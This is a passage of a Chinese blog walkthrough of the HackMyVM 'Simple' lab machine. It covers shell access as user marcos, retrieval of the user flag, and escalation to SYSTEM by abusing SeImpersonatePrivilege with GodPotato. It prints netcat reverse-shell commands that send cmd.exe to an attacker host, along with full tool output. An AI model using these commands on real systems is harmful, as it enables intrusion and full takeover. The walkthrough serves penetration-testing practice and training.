Warning: LoadUserProfile failed due to insufficient permissions</span><br><span class="line"></span><br><span class="line">[+] Running <span class="keyword">in</span> session 0 with process <span class="keyword">function</span> CreateProcessAsUserW()</span><br><span class="line">[+] Using Station\Desktop: Service-0x0-b5bb4$\Default</span><br><span class="line">[+] Async process <span class="string">&#x27;C:\Windows\system32\cmd.exe&#x27;</span> with pid 1972 created <span class="keyword">in</span> background.</span><br><span class="line"></span><br><span class="line">c:\inetpub\wwwroot&gt;</span><br></pre></td></tr></table></figure>
<p>成功获得 marcos 权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nc -nvlp 4444               </span></span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.0.3.28] from (UNKNOWN) [10.0.3.30] 49671</span><br><span class="line">Microsoft Windows [Versi�n 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation. Todos los derechos reservados.</span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;<span class="built_in">whoami</span> /all</span><br><span class="line"><span class="built_in">whoami</span> /all</span><br><span class="line"></span><br><span class="line">INFORMACI�N DE USUARIO</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Nombre de usuario SID                                           </span><br><span class="line">================= ==============================================</span><br><span class="line">simple\marcos     S-1-5-21-2519875556-2276787807-2868128514-1003</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">INFORMACI�N DE GRUPO</span><br><span class="line">--------------------</span><br><span class="line"></span><br><span class="line">Nombre de grupo                              Tipo           SID          Atributos                                                               </span><br><span class="line">============================================ ============== ============ ========================================================================</span><br><span class="line">Todos                                        Grupo conocido S-1-1-0      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">BUILTIN\Usuarios                             Alias          S-1-5-32-545 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\INTERACTIVE                     Grupo conocido S-1-5-4      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">INICIO DE SESI�N EN LA CONSOLA               Grupo conocido S-1-2-1      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\Usuarios autentificados         Grupo conocido S-1-5-11     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\Esta compa��a                   Grupo conocido S-1-5-15     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\Cuenta <span class="built_in">local</span>                    Grupo conocido S-1-5-113    Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\Autenticaci�n NTLM              Grupo conocido S-1-5-64-10  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">Etiqueta obligatoria\Nivel obligatorio medio Etiqueta       S-1-16-8192                                                                          </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">INFORMACI�N DE PRIVILEGIOS</span><br><span class="line">--------------------------</span><br><span class="line"></span><br><span class="line">Nombre de privilegio          Descripci�n                                  Estado    </span><br><span class="line">============================= ============================================ ==========</span><br><span class="line">SeChangeNotifyPrivilege       Omitir comprobaci�n de recorrido             Habilitada</span><br><span class="line">SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;</span><br></pre></td></tr></table></figure>
<p>信息收集得 user.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\marcos\Desktop&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> El volumen de la unidad C no tiene etiqueta.</span><br><span class="line"> El n�mero de serie del volumen es: 26CD-AE41</span><br><span class="line"></span><br><span class="line"> Directorio de C:\Users\marcos\Desktop</span><br><span class="line"></span><br><span class="line">08/10/2023  23:09    &lt;DIR&gt;          .</span><br><span class="line">08/10/2023  23:09    &lt;DIR&gt;          ..</span><br><span class="line">08/10/2023  23:09                44 user.txt</span><br><span class="line">               1 archivos             44 bytes</span><br><span class="line">               2 <span class="built_in">dirs</span>  45.243.736.064 bytes libres</span><br><span class="line"></span><br><span class="line">C:\Users\marcos\Desktop&gt;<span class="built_in">type</span> user.txt</span><br><span class="line"><span class="built_in">type</span> user.txt</span><br><span class="line">SIMPLE&#123;……&#125;</span><br></pre></td></tr></table></figure>
<h3 id="提权至-system">2.3. 提权至 system</h3>
<p>没找到提权方法，看了其他师傅的方法是利用
<code>iis apppool\defaultapppool</code> 用户启用了
SeImpersonatePrivilege 权限【2.1 <code>whoami /all</code>
直接结果可见】而提权的</p>
<blockquote>
<p><strong>SeImpersonatePrivilege (模拟权限)</strong></p>
<ul>
<li>允许用户在通过身份验证后模拟其他用户，以访问不同权限的资源，默认启用。</li>
</ul>
</blockquote>
<p>可直接利用的提权工具</p>
<blockquote>
<p>GodPotato【<a target="_blank" rel="noopener" href="https://github.com/BeichenDream/GodPotato">GitHub
- BeichenDream/GodPotato</a>】</p>
<p>Based on the history of Potato privilege escalation for 6 years, from
the beginning of RottenPotato to the end of JuicyPotatoNG, I discovered
a new technology by researching DCOM, which enables privilege escalation
in Windows 2012 - Windows 2022, now as long as you have
"ImpersonatePrivilege" permission. Then you are "NT AUTHORITY", usually
WEB services and database services have "ImpersonatePrivilege"
permissions.</p>
<p>Potato privilege escalation is usually used when we obtain
WEB/database privileges. We can elevate a service user with low
privileges to "NT AUTHORITY" privileges. However, the historical Potato
has no way to run on the latest Windows system. When I was researching
DCOM, I found a new method that can perform privilege escalation. There
are some defects in rpcss when dealing with oxid, and rpcss is a service
that must be opened by the system. , so it can run on almost any Windows
OS, I named it GodPotato</p>
</blockquote>
<p>Usage:</p>
<p>Customize Clsid and execute commands</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GodPotato -cmd <span class="string">&quot;cmd /c whoami&quot;</span></span><br></pre></td></tr></table></figure>
<p>Execute reverse shell commands</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GodPotato -cmd <span class="string">&quot;nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012&quot;</span></span><br></pre></td></tr></table></figure>
<p>测试可成功获得 system 权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">c:\inetpub\wwwroot&gt;c:\inetpub\wwwroot\GodPotato-NET4.exe -cmd <span class="string">&quot;cmd /c whoami&quot;</span></span><br><span class="line">c:\inetpub\wwwroot\GodPotato-NET4.exe -cmd <span class="string">&quot;cmd /c whoami&quot;</span></span><br><span class="line">[*] CombaseModule: 0x140706425864192</span><br><span class="line">[*] DispatchTable: 0x140706428181744</span><br><span class="line">[*] UseProtseqFunction: 0x140706427557024</span><br><span class="line">[*] UseProtseqFunctionParamCount: 6</span><br><span class="line">[*] HookRPC</span><br><span class="line">[*] Start PipeServer</span><br><span class="line">[*] CreateNamedPipe \\.\pipe\edf3190f-5eb5-4f56-9c4b-12e3a426389d\pipe\epmapper</span><br><span class="line">[*] Trigger RPCSS</span><br><span class="line">[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046</span><br><span class="line">[*] DCOM obj IPID: 00006402-0404-ffff-655a-b899efc3ebca</span><br><span class="line">[*] DCOM obj OXID: 0x1fa73ec8f246f9a9</span><br><span class="line">[*] DCOM obj OID: 0x30db16d1a812ce9a</span><br><span class="line">[*] DCOM obj Flags: 0x281</span><br><span class="line">[*] DCOM obj PublicRefs: 0x0</span><br><span class="line">[*] Marshal Object bytes len: 100</span><br><span class="line">[*] UnMarshal Object</span><br><span class="line">[*] Pipe Connected!</span><br><span class="line">[*] CurrentUser: NT AUTHORITY\Servicio de red</span><br><span class="line">[*] CurrentsImpersonationLevel: Impersonation</span><br><span class="line">[*] Start Search System Token</span><br><span class="line">[*] PID : 744 Token:0x372  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation</span><br><span class="line">[*] Find System Token : True</span><br><span class="line">[*] UnmarshalObject: 0x80070776</span><br><span class="line">[*] CurrentUser: NT AUTHORITY\SYSTEM</span><br><span class="line">[*] process start with pid 320</span><br><span class="line"></span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">c:\inetpub\wwwroot&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>经测靶机没有 nc ，可利用 SMB 传个上去反弹 Shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\inetpub\wwwroot\GodPotato-NET4.exe -cmd <span class="string">&quot;c:\inetpub\wwwroot\netcat-win32-1.12\nc.exe -t -e cmd.exe 10.0.3.28 4445&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410281531540.jpg" /></p>
<p>成功获得 system 权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nc -nvlp 4445</span></span><br><span class="line">listening on [any] 4445 ...</span><br><span class="line">connect to [10.0.3.28] from (UNKNOWN) [10.0.3.30] 49684</span><br><span class="line">Microsoft Windows [Versi�n 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation. Todos los derechos reservados.</span><br><span class="line"></span><br><span class="line">c:\inetpub\wwwroot\netcat-win32-1.12&gt;<span class="built_in">whoami</span> /all</span><br><span class="line"><span class="built_in">whoami</span> /all</span><br><span class="line"></span><br><span class="line">INFORMACI�N DE USUARIO</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Nombre de usuario   SID     </span><br><span class="line">=================== ========</span><br><span class="line">nt authority\system S-1-5-18</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">INFORMACI�N DE GRUPO</span><br><span class="line">--------------------</span><br><span class="line"></span><br><span class="line">Nombre de grupo                                    Tipo           SID                                                           Atributos                                                                  </span><br><span class="line">================================================== ============== ============================================================= ===========================================================================</span><br><span class="line">Etiqueta obligatoria\Nivel obligatorio del sistema Etiqueta       S-1-16-16384                                                                                                                             </span><br><span class="line">Todos                                              Grupo conocido S-1-1-0                                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado   </span><br><span class="line">BUILTIN\Usuarios                                   Alias          S-1-5-32-545                                                  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado   </span><br><span class="line">NT AUTHORITY\SERVICIO                              Grupo conocido S-1-5-6                                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado   </span><br><span class="line">INICIO DE SESI�N EN LA CONSOLA                     Grupo conocido S-1-2-1                                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado   </span><br><span class="line">NT AUTHORITY\Usuarios autentificados               Grupo conocido S-1-5-11                                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado   </span><br><span class="line">NT AUTHORITY\Esta compa��a                         Grupo conocido S-1-5-15                                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado   </span><br><span class="line">NT SERVICE\StateRepository                         Grupo conocido S-1-5-80-4118144674-975173503-976751360-2062754009-4288402176 Habilitado de manera predeterminada, Grupo habilitado, Propietario de grupo</span><br><span class="line">LOCAL                                              Grupo conocido S-1-2-0                                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado   </span><br><span class="line">BUILTIN\Administradores                            Alias          S-1-5-32-544                                                  Habilitado de manera predeterminada, Grupo habilitado, Propietario de grupo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">INFORMACI�N DE PRIVILEGIOS</span><br><span class="line">--------------------------</span><br><span class="line"></span><br><span class="line">Nombre de privilegio            Descripci�n                                         Estado       </span><br><span class="line">=============================== =================================================== =============</span><br><span class="line">SeAssignPrimaryTokenPrivilege   Reemplazar un s�mbolo (token) de nivel de proceso   Deshabilitado</span><br><span class="line">SeTcbPrivilege                  Actuar como parte del sistema operativo             Habilitada   </span><br><span class="line">SeSecurityPrivilege             Administrar registro de seguridad y auditor�a       Deshabilitado</span><br><span class="line">SeTakeOwnershipPrivilege        Tomar posesi�n de archivos y otros objetos          Deshabilitado</span><br><span class="line">SeIncreaseBasePriorityPrivilege Aumentar prioridad de programaci�n                  Habilitada   </span><br><span class="line">SeCreatePermanentPrivilege      Crear objetos compartidos permanentes               Habilitada   </span><br><span class="line">SeBackupPrivilege               Hacer copias de seguridad de archivos y directorios Deshabilitado</span><br><span class="line">SeRestorePrivilege              Restaurar archivos y directorios                    Deshabilitado</span><br><span class="line">SeChangeNotifyPrivilege         Omitir comprobaci�n de recorrido                    Habilitada   </span><br><span class="line">SeImpersonatePrivilege          Suplantar a un cliente tras la autenticaci�n        Habilitada   </span><br><span class="line">SeCreateGlobalPrivilege         Crear objetos globales                              Habilitada   </span><br><span class="line"></span><br><span class="line">ERROR: no se puede obtener informaci�n de notificaciones de usuario.</span><br><span class="line"></span><br><span class="line">c:\inetpub\wwwroot\netcat-win32-1.12&gt;</span><br></pre></td></tr></table></figure>
<p>管理员桌面拿到 root.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">c:\Users\Administrador\Desktop&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> El volumen de la unidad C no tiene etiqueta.</span><br><span class="line"> El n�mero de serie del volumen es: 26CD-AE41</span><br><span class="line"></span><br><span class="line"> Directorio de c:\Users\Administrador\Desktop</span><br><span class="line"></span><br><span class="line">26/09/2023  14:11    &lt;DIR&gt;          .</span><br><span class="line">26/09/2023  14:11    &lt;DIR&gt;          ..</span><br><span class="line">08/10/2023  23:07                66 root.txt</span><br><span class="line">               1 archivos             66 bytes</span><br><span class="line">               2 <span class="built_in">dirs</span>  45.229.076.480 bytes libres</span><br><span class="line"></span><br><span class="line">c:\Users\Administrador\Desktop&gt;<span class="built_in">type</span> root.txt</span><br><span class="line"><span class="built_in">type</span> root.txt</span><br><span class="line">SIMPLE&#123;……&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="参考">3. 参考</h2>
<ul>
<li><a
target="_blank" rel="noopener" href="https://book.hacktricks.xyz/cn/network-services-pentesting/pentesting-smb#cong-linux-jin-xing-gui-lian-jie">139,445
- Pentesting SMB | HackTricks</a><br />
</li>
<li><a
target="_blank" rel="noopener" href="https://medium.com/@brntpcnr/hackmyvm-simple-a462ba5ffa1c">HackMyVM:
Simple. Here we are with a Windows based CTF… | by Baran |
Medium</a><br />
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/GodPotato">GitHub -
BeichenDream/GodPotato</a></li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>Phantom
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://z9m8r8.github.io/2024/10/28/HackMyVM%20-%20Simple/" title="HackMyVM - Simple">https://z9m8r8.github.io/2024/10/28/HackMyVM - Simple/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"><i class="fa fa-tag"></i> 信息收集</a>
              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
              <a href="/tags/%E5%8F%8D%E5%BC%B9-shell/" rel="tag"><i class="fa fa-tag"></i> 反弹 shell</a>
              <a href="/tags/SMB/" rel="tag"><i class="fa fa-tag"></i> SMB</a>
              <a href="/tags/HackMyVM/" rel="tag"><i class="fa fa-tag"></i> HackMyVM</a>
              <a href="/tags/crackmapexec/" rel="tag"><i class="fa fa-tag"></i> crackmapexec</a>
              <a href="/tags/RunasCs/" rel="tag"><i class="fa fa-tag"></i> RunasCs</a>
              <a href="/tags/Windows/" rel="tag"><i class="fa fa-tag"></i> Windows</a>
              <a href="/tags/ASP-NET/" rel="tag"><i class="fa fa-tag"></i> ASP.NET</a>
              <a href="/tags/aspx-reverse-shell/" rel="tag"><i class="fa fa-tag"></i> aspx-reverse-shell</a>
              <a href="/tags/SeImpersonatePrivilege-%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> SeImpersonatePrivilege 提权</a>
              <a href="/tags/GodPotato/" rel="tag"><i class="fa fa-tag"></i> GodPotato</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/10/19/SickOs%201.1/" rel="prev" title="VulnHub - SickOs: 1.1">
                  <i class="fa fa-angle-left"></i> VulnHub - SickOs: 1.1
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/10/30/HackMyVM%20-%20Zero/" rel="next" title="HackMyVM - Zero">
                  HackMyVM - Zero <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2020 – 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Phantom</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">339k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">20:33</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/fancybox.js"></script>

  <script src="/js/third-party/pace.js"></script>


  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>


  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2024/10/28/HackMyVM%20-%20Simple/"}</script>
  <script src="/js/third-party/quicklink.js"></script>

</body>
</html>
